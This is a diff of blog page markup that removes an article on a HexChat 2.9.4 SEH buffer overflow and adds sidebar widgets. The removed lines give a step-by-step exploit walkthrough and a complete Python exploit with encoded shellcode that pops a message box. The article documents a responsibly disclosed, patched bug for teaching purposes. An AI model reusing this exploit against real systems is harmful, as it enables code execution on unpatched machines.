@@ -91,271 +91,520 @@
 		<div style='clear: both;'></div>
 	</div>
 	
+	<div style='clear: both;'></div>
+	<div id="outer-wrapper" class="index home">
 
-<div id="main">
-  <div id="content">
-    <div>
-      <article class="hentry" role="article">
+<div class='row' id='content-wrapper'>
+    <div id='main-wrapper'>
+      <div class='main section' id='main'>
+      
+
 
         
-        
 
-        <div class="entry-content">
-          
-          
-          
-          
 
-<p>A buddy of mine, <a href="https://twitter.com/imulitia">Mulitia</a>, and I were talking about 0-days, and he mentioned finding one in Hex-Chat, a popular IRC client. It was super low severity, but still neat. If you entered &ldquo;/server &rdquo; followed by 20,000 random characters, the application died. I decided to try to make a working exploit out of this for fun.</p>
-
-<!-- more -->
-
-<p>I contacted HexChat, by initialling going into the #hexchat channel on irc.freenode.net and trying to find a security contact. TingPing said I could give the details specifically through him. Eventually an issue was created: <a href="https://github.com/hexchat/hexchat/issues/463">https://github.com/hexchat/hexchat/issues/463</a></p>
-
-<h2 id="walkthrough-of-the-exploit">Walkthrough of the exploit</h2>
-
-<p>This exploit was a little more complicated than many I&rsquo;ve had to do previously. It has 3 stages, due to bad characters that can&rsquo;t be entered in the payload (pretty much anything non-alpha-numeric).</p>
-
-<h2 id="the-offset">The offset</h2>
-
-<p>First thing&rsquo;s first, when developing an exploit, you need to have the offset of the buffer so you know where to put executable statements. By using the pattern_create functionality of Mona.py, I made a 25,000 line unique string, and ran it into the program while attached to a debugger.</p>
-
-
-<figure class="img-responsive">
-    
-        <img src="/img/hexchat_pc.png" />
-    
-    
-</figure>
-
-
-<p>I then took this long pattern, and pasted it into HexChat&rsquo;s textbox, after a &ldquo;/server &rdquo; string:</p>
-
-
-<figure class="img-responsive">
-    
-        <img src="/img/hexchat_pattern.png" />
-    
-    
-</figure>
-
-
-<p>Once I hit enter, the debugger stated:</p>
-
-<blockquote>
-<p>Access violation when writing to [00130000] - use Shift+F7/F8/F9 to pass the exception to the program</p>
-</blockquote>
-
-<p>Since an exception was raised, I checked the SEH window, to see if I had overwritten the SEH handler.</p>
-
-
-<figure class="img-responsive">
-    
-        <img src="/img/hexchat_seh.png" />
-    
-    
-</figure>
-
-
-<p>Indeed, I had overwritten the SEH handler with &ldquo;37635236&rdquo;. I then ran mona&rsquo;s pattern_offset to find the offset of the string that would overwrite the SEH handler.</p>
-
-
-<figure class="img-responsive">
-    
-        <img src="/img/hexchat_po.png" />
-    
-    
-</figure>
-
-
-<p>Based on this knowledge, I knew the offset would be somewhere around 13340 bytes in. Since this was an SEH exploit, the next step was to find an instruction that did a pop-pop-ret.</p>
-
-<h2 id="pop-pop-ret">Pop-Pop-Ret</h2>
-
-<p>Finding a valid pop-pop-ret instruction became a bit difficult, because I started to find out that HexChat would pretty much only use ASCII characters. Luckily, Mona.py had me covered, and can search for filtered characters:</p>
-
-
-<figure class="img-responsive">
-    
-        <img src="/img/hexchat_mona_seh.png" />
-    
-    
-</figure>
-
-
-<p>I went through the seh.txt file that had all the addresses, and found one that I liked:</p>
-
-<blockquote>
-<p>0x68626463 : pop ebx # pop ebp # ret | asciiprint,ascii,lower {PAGE_EXECUTE_READ} [libglib-2.0-0.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.26.1.0 (C:\Program Files\HexChat\libglib-2.0-0.dll)</p>
-</blockquote>
-
-<p>This string was all lowercase letters, had no ASLR or SafeSEH, so it seemed like a fairly good address to use.</p>
-
-<h2 id="the-jump">The jump</h2>
-
-<p>I created a little test exploit stub so I could see the memory after the pop-pop-ret occurred. It wasn&rsquo;t really anything special.</p>
-
-<pre><code>mandreko$ perl -e 'print &quot;A&quot;x13340 . &quot;\x63\x64\x62\x68&quot; . &quot;C&quot;x11656'
-</code></pre>
-
-<p>I pasted it into HexChat, and saw the same Access Violation. I checked the SEH window to make sure I overwrote properly:</p>
-
-
-<figure class="img-responsive">
-    
-        <img src="/img/hexchat_seh2.png" />
-    
-    
-</figure>
-
-
-<p>You can see there, that the SEH is now pointing to the address of the pop-pop-ret. I created a breakpoint for 0x68626463 and hit Shift-F9. I hit the breakpoint, and F7 3 times to step through the pop-pop-ret.</p>
-
-
-<figure class="img-responsive">
-    
-        <img src="/img/hexchat_after_ppr.png" />
-    
-    
-</figure>
-
-
-<p>Typically, in an SEH exploit, right before the PPR instruction, you&rsquo;d put the next instruction that you want to execute, the nseh (more details at <a href="https://www.corelan.be/index.php/2009/07/28/seh-based-exploit-writing-tutorial-continued-just-another-example-part-3b/">Corelan&rsquo;s excellent blog</a>). This instruction is typically a jump. Due to our ascii issue, I found it was possible to do a 21 byte jump, by using a conditional &ldquo;JA&rdquo; jump (see <a href="http://www.unixwiz.net/techtips/x86-jumps.html">here</a> for jump details) instruction. I had to prepend 2 &ldquo;DEC ESP&rdquo; instructions to make the conditional jump work, by setting the proper flags. This left my exploit stub looking like:</p>
-
-<pre><code>mandreko$ perl -e 'print &quot;A&quot;x13336 . &quot;\x4c\x4c\x77\x21&quot; . &quot;\x63\x64\x62\x68&quot; . &quot;C&quot;x11656'
-</code></pre>
-
-<h2 id="getting-more-space">Getting more space</h2>
-
-<p>I ran the exploit stub, followed the pop-pop-ret and then the jump, and found myself in memory that I controlled. That was the good news. Unfortunately, the bad news was that I only had a very limited amount of space to put any payload (43 bytes). My first thought was to use an egghunter, however egghunters had non-ascii characters in them, and when encoded properly, were well over 43 bytes long. This left me thinking for a good while.</p>
-
-<p>After a couple days of thinking, I thought about using a fairly non-traditional method to exploit this. In the stack, way down, was a pointer to the beginning of the buffer I sent into HexChat. I was able to use the <a href="https://en.wikipedia.org/wiki/X86_instruction_listings">POPAD instruction</a> to get rid of several ESP values at once, since it&rsquo;s Opcode was an ASCII character. By combining 38 POPAD instructions, I was able to get to the pointer in memory, and still have 5 bytes of memory to try to load it. My exploit-stub ended up looking like this:</p>
-
-<pre><code>mandreko$ perl -e 'print &quot;A&quot;x13336 . &quot;\x4c\x4c\x77\x21&quot; . &quot;\x63\x64\x62\x68&quot; . &quot;C&quot;x29 . &quot;\x61&quot;x38 . &quot;C&quot;x11589'
-</code></pre>
-
-<p>When I ran it through the debugger, it worked out perfectly.</p>
-
-
-<figure class="img-responsive">
-    
-        <img src="/img/hexchat_after_popad.png" />
-    
-    
-</figure>
-
-
-<h2 id="finding-the-jump-via-corruption">Finding the jump via corruption</h2>
-
-<p>With only 5 bytes remaining, and ASCII encoding requirements, I pondered a bit. I couldn&rsquo;t see any way to get a &ldquo;JMP ESP&rdquo;. I found a JMP ESP in one of the loaded libraries, but I didn&rsquo;t have enough space to push it into memory and then RETN. For some reason, during testing, I found that some of my non-ASCII characters were bad-characters, and would get translated to RETN statements. I thought perhaps I could use a &ldquo;PUSH ESP&rdquo; instruction which was ASCII, and then use a bad-character to convert into a &ldquo;RETN&rdquo; instruction, since it typically would not be ASCII (\xc3). It ended up working. I put a &ldquo;\xE9&rdquo;, and it converted it to &ldquo;RETN&rdquo; and then an &ldquo;\x88&rdquo;. Since I&rsquo;d never be hitting the &ldquo;\x88&rdquo; I figured this would work. I tried it, and miraculously it did! Using a corrupted character actually let it jump!</p>
-
-
-<figure class="img-responsive">
-    
-        <img src="/img/hexchat_push_esp.png" />
-    
-    
-</figure>
-
-
-<p>After taking the &ldquo;RETN&rdquo;, it placed me in an area with thousands of bytes for shellcode.</p>
-
-
-<figure class="img-responsive">
-    
-        <img src="/img/hexchat_after_push_esp.png" />
-    
-    
-</figure>
-
-
-<p>From this point, it was just as easy as inserting some alpha-numeric encoded shellcode, and changing some lengths of junk strings.</p>
-
-<h2 id="the-final-working-exploit">The final working exploit</h2>
-
-<pre><code>#!/usr/bin/python
-# HexChat 2.9.4 Local Exploit
-# Bug found by Jules Carter &lt; @iMulitia &gt;
-# Exploit by Matt &quot;hostess&quot; Andreko &lt; mandreko [at] accuvant.com &gt;
-# http://www.mattandreko.com/2013/04/buffer-overflow-in-hexchat-294.html
-junk1 = &quot;B&quot;*30
-shellcode = (
-# msfvenom -p windows/messagebox EXITFUNC=process BufferRegister=ESP -e x86/alpha_mixed -f c
-&quot;\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49&quot;
-&quot;\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b&quot;
-&quot;\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58&quot;
-&quot;\x50\x38\x41\x42\x75\x4a\x49\x78\x59\x68\x6b\x6d\x4b\x4b\x69&quot;
-&quot;\x44\x34\x64\x64\x59\x64\x74\x71\x78\x52\x6c\x72\x33\x47\x34&quot;
-&quot;\x71\x78\x49\x42\x44\x4e\x6b\x50\x71\x50\x30\x4e\x6b\x64\x36&quot;
-&quot;\x54\x4c\x4c\x4b\x44\x36\x77\x6c\x4c\x4b\x33\x76\x77\x78\x4c&quot;
-&quot;\x4b\x73\x4e\x51\x30\x4e\x6b\x75\x66\x56\x58\x72\x6f\x72\x38&quot;
-&quot;\x51\x65\x68\x73\x43\x69\x37\x71\x38\x51\x39\x6f\x58\x61\x73&quot;
-&quot;\x50\x4e\x6b\x30\x6c\x36\x44\x77\x54\x6c\x4b\x42\x65\x75\x6c&quot;
-&quot;\x6e\x6b\x73\x64\x36\x48\x31\x68\x46\x61\x6a\x4a\x4e\x6b\x52&quot;
-&quot;\x6a\x66\x78\x6e\x6b\x73\x6a\x57\x50\x43\x31\x7a\x4b\x6d\x33&quot;
-&quot;\x34\x74\x42\x69\x6c\x4b\x47\x44\x4c\x4b\x67\x71\x48\x6e\x74&quot;
-&quot;\x71\x6b\x4f\x36\x51\x79\x50\x6b\x4c\x4e\x4c\x4c\x44\x39\x50&quot;
-&quot;\x34\x34\x75\x57\x49\x51\x4a\x6f\x36\x6d\x67\x71\x4a\x67\x5a&quot;
-&quot;\x4b\x5a\x54\x67\x4b\x71\x6c\x61\x34\x34\x68\x32\x55\x6d\x31&quot;
-&quot;\x6e\x6b\x33\x6a\x47\x54\x76\x61\x38\x6b\x71\x76\x4c\x4b\x64&quot;
-&quot;\x4c\x52\x6b\x4e\x6b\x71\x4a\x67\x6c\x67\x71\x4a\x4b\x4e\x6b&quot;
-&quot;\x74\x44\x4c\x4b\x76\x61\x69\x78\x4e\x69\x62\x64\x66\x44\x47&quot;
-&quot;\x6c\x63\x51\x5a\x63\x6e\x52\x33\x38\x61\x39\x69\x44\x6b\x39&quot;
-&quot;\x59\x75\x6c\x49\x58\x42\x73\x58\x4e\x6e\x72\x6e\x56\x6e\x58&quot;
-&quot;\x6c\x62\x72\x4d\x38\x4f\x6f\x6b\x4f\x69\x6f\x69\x6f\x4f\x79&quot;
-&quot;\x61\x55\x75\x54\x6d\x6b\x31\x6e\x4e\x38\x79\x72\x70\x73\x6f&quot;
-&quot;\x77\x45\x4c\x45\x74\x70\x52\x39\x78\x6c\x4e\x4b\x4f\x49\x6f&quot;
-&quot;\x59\x6f\x6f\x79\x43\x75\x55\x58\x73\x58\x62\x4c\x70\x6c\x51&quot;
-&quot;\x30\x77\x31\x53\x58\x67\x43\x54\x72\x66\x4e\x61\x74\x71\x78&quot;
-&quot;\x52\x55\x44\x33\x62\x45\x61\x62\x6d\x58\x51\x4c\x75\x74\x57&quot;
-&quot;\x7a\x4c\x49\x58\x66\x73\x66\x6b\x4f\x30\x55\x47\x74\x6b\x39&quot;
-&quot;\x4f\x32\x72\x70\x4d\x6b\x39\x38\x6d\x72\x72\x6d\x4f\x4c\x4b&quot;
-&quot;\x37\x35\x4c\x67\x54\x30\x52\x5a\x48\x75\x31\x39\x6f\x6b\x4f&quot;
-&quot;\x39\x6f\x33\x58\x42\x4f\x34\x38\x53\x68\x31\x30\x72\x48\x35&quot;
-&quot;\x31\x73\x57\x61\x75\x62\x62\x35\x38\x72\x6d\x72\x45\x54\x33&quot;
-&quot;\x62\x53\x54\x71\x69\x4b\x6f\x78\x33\x6c\x75\x74\x54\x4a\x6f&quot;
-&quot;\x79\x78\x63\x61\x78\x72\x78\x45\x70\x77\x50\x75\x70\x70\x68&quot;
-&quot;\x72\x6d\x50\x53\x37\x36\x77\x51\x70\x68\x43\x42\x30\x6f\x42&quot;
-&quot;\x4d\x71\x30\x35\x38\x52\x4f\x66\x4c\x31\x30\x61\x76\x61\x78&quot;
-&quot;\x71\x58\x50\x65\x42\x4c\x32\x4c\x55\x61\x5a\x69\x6e\x68\x72&quot;
-&quot;\x6c\x61\x34\x44\x50\x4f\x79\x4d\x31\x56\x51\x4b\x62\x33\x62&quot;
-&quot;\x61\x43\x46\x31\x52\x72\x39\x6f\x58\x50\x46\x51\x49\x50\x42&quot;
-&quot;\x70\x69\x6f\x36\x35\x34\x48\x41\x41&quot;
-)
-junk2 = &quot;A&quot;*(13306-len(shellcode))
-stage1 = &quot;\x4c\x4c\x77\x21&quot; # 21 byte jump (JA)
-ret = &quot;\x63\x64\x62\x68&quot; # ASCII PPR
-junk3 = &quot;C&quot;*29
-stage2 = &quot;\x61&quot;*38 # POPAD x 38
-stage2 += &quot;\x54&quot; # PUSH ESP
-stage2 += &quot;\xE9&quot; # RETN # This byte is a bad char, but gets converted to RETN and \x88
-junk4 = &quot;D&quot;*11586
-
-print &quot;Copy this text, and enter into HexChat's textbox: \&quot;/server [string]\&quot;&quot; 
-print junk1 + shellcode + junk2 + stage1 + ret + junk3 + stage2 + junk4
-</code></pre>
-
-<h2 id="demo-time">Demo time!</h2>
-
-<p>Here is a video demo of the exploit working with a simple messagebox payload.
-
-<div style="position: relative; padding-bottom: 56.25%; padding-top: 30px; height: 0; overflow: hidden;">
-  <iframe src="//www.youtube.com/embed/izmMjz_g-84" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;" allowfullscreen frameborder="0"></iframe>
- </div>
-</p>
-
-<h2 id="remediation">Remediation</h2>
-
-<p>It&rsquo;s suggested that all users upgrade to 2.9.5 where this vulnerability has been fixed. HexChat is available here: <a href="http://hexchat.org/downloads.html">http://hexchat.org/downloads.html</a></p>
-
-        </div>
-        
-      </article>
+      
+      </div>
     </div>
     
-  </div>
+    <div id='sidebar-wrapper'>
+      <div class='sidebar ready-widget section' id='sidebar'>
+        <div class='widget HTML' data-version='1' id='HTML3'>
+	<h2 class='title'>Author</h2>
+	<div class='widget-content'>
+		<div class="sidebar_about_author">
+			<div class="inner_wrapper">
+				<div class="aboutme-img">
+					<img alt="Author" class="img-responsive" height="388px" src="https://www.mattandreko.com/img/mattandreko_photo.jpg" title="Author (Matt Andreko)" width="300px">
+				</div>
+			</div>
+			<div class="aboutme-info">
+				<h4>Matt Andreko</h4>
+				<p>Security Consultant</p>
+			</div>
+		</div>
+	</div>
+	<div class='clear'></div>
 </div>
+        <div class='widget PopularPosts' data-version='1' id='PopularPosts1'>
+	<h2>Popular Articles</h2>
+	<div class='widget-content popular-posts'>
+		<ul>
+			<li>
+				<div class='item-thumbnail-only'>
+					<div class='item-thumbnail'>
+						<a href='https://pixel-way2themes.blogspot.in/2015/03/love-writing-and-sharing.html'>
+							<img alt='LOVE WRITING AND SHARING' border='0' height='72' src='http://placehold.it/90x65' width='72'/>
+						</a>
+					</div>
+					<div class='item-title'><a href='https://pixel-way2themes.blogspot.in/2015/03/love-writing-and-sharing.html'>SOME BLOG POST 1</a></div>
+				</div>
+				<div style='clear: both;'></div>
+			</li>
+			<li>
+				<div class='item-thumbnail-only'>
+					<div class='item-thumbnail'>
+						<a href='https://pixel-way2themes.blogspot.in/2015/03/the-ultimate-consumers.html'>
+							<img alt='THE ULTIMATE CONSUMERS' border='0' height='72' src='http://placehold.it/90x65' width='72'/>
+						</a>
+					</div>
+					<div class='item-title'><a href='https://pixel-way2themes.blogspot.in/2015/03/the-ultimate-consumers.html'>SOME BLOG POST 2</a></div>
+				</div>
+				<div style='clear: both;'></div>
+			</li>
+			<li>
+				<div class='item-thumbnail-only'>
+					<div class='item-thumbnail'>
+						<a href='https://pixel-way2themes.blogspot.in/2015/03/it-is-beyond-blogging.html'>
+							<img alt='IT IS BEYOND BLOGGING' border='0' height='72' src='http://placehold.it/90x65' width='72'/>
+						</a>
+					</div>
+					<div class='item-title'><a href='https://pixel-way2themes.blogspot.in/2015/03/it-is-beyond-blogging.html'>SOME BLOG POST 3</a></div>
+				</div>
+				<div style='clear: both;'></div>
+			</li>
+			<li>
+				<div class='item-thumbnail-only'>
+					<div class='item-thumbnail'>
+						<a href='https://pixel-way2themes.blogspot.in/2015/03/starbucks-represents-something-beyond.html'>
+							<img alt='STARBUCKS REPRESENTS SOMETHING' border='0' height='72' src='http://placehold.it/90x65' width='72'/>
+						</a>
+					</div>
+					<div class='item-title'><a href='https://pixel-way2themes.blogspot.in/2015/03/starbucks-represents-something-beyond.html'>SOME BLOG POST 4</a></div>
+				</div>
+				<div style='clear: both;'></div>
+			</li>
+		</ul>
+		<div class='clear'></div>
+	</div>
+</div>
+        <div class='widget HTML' data-version='1' id='HTML2'>
+	<h2 class='title'>Featured</h2>
+	<div class='widget-content'>
+		<span class="labelpost" data-label="Magazine" data-no="4"></span>
+	</div>
+	<div class='clear'></div>
+	<span class='widget-item-control'>
+		<span class='item-control blog-admin'>
+			<a class='quickedit' href='//www.blogger.com/rearrange?blogID=3868080948025121998&widgetType=HTML&widgetId=HTML2&action=editWidget&sectionId=sidebar' onclick='return _WidgetManager._PopupConfig(document.getElementById("HTML2"));' target='configHTML2' title='Edit'>
+				<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
+			</a>
+		</span>
+	</span>
+	<div class='clear'></div>
+</div>
+        <div class='widget Label' data-version='1' id='Label1'>
+	<h2>Categories</h2>
+	<div class='widget-content cloud-label-widget-content'>
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/antivirus'>antivirus</a>
+			</span>
 
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/aslr'>aslr</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/assembly'>assembly</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/brainpan'>brainpan</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/browsers'>browsers</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/burp'>burp</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/canon'>canon</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/certification'>certification</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/commandinjection'>commandinjection</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/cookies'>cookies</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/csharp'>csharp</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/ctp'>ctp</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/cucumber'>cucumber</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/directorytraversal'>directorytraversal</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/dos'>dos</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/dotnet'>dotnet</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/encoding'>encoding</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/exif'>exif</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/exploit'>exploit</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/exploit-exercises'>exploit-exercises</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/fail'>fail</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/fogbugz'>fogbugz</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/food'>food</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/formatstring'>formatstring</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/fusion'>fusion</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/future'>future</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/gac'>gac</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/getoffmylawn'>getoffmylawn</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/greasemonkey'>greasemonkey</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/hacking'>hacking</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/heap'>heap</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/hexchat'>hexchat</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/hover'>hover</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/html'>html</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/http'>http</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/includes'>includes</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/injection'>injection</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/iphone'>iphone</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/kioptrix'>kioptrix</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/linux'>linux</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/metasploit'>metasploit</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/mips'>mips</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/monxla'>monxla</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/natas'>natas</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/nebula'>nebula</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/net'>net</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/offsec'>offsec</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/oscp'>oscp</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/osx'>osx</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/overthewire'>overthewire</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/php'>php</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/printer'>printer</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/projects'>projects</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/protostar'>protostar</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/pwb'>pwb</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/pwcrack'>pwcrack</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/rails'>rails</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/rant'>rant</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/ret2libc'>ret2libc</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/ret2text'>ret2text</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/rop'>rop</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/rspec'>rspec</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/security'>security</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/shellcode'>shellcode</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/sprint'>sprint</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/sqlinjection'>sqlinjection</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/ssh'>ssh</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/suid'>suid</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/sysax'>sysax</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/tdd'>tdd</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/testing'>testing</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/til'>til</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/ui'>ui</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/userscript'>userscript</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/vim'>vim</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/wargames'>wargames</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/windows'>windows</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/xor'>xor</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/xss'>xss</a>
+			</span>
+
+		
+		<div class='clear'></div>
+	</div>
+</div>
+      </div>
+    </div>
+    <div style='clear: both;'></div>
+  </div>
+
+
+
+
+
+		</div>
 		
 		<div id='w2t_footer'>
 			<div class='w2t-copy-container row'>
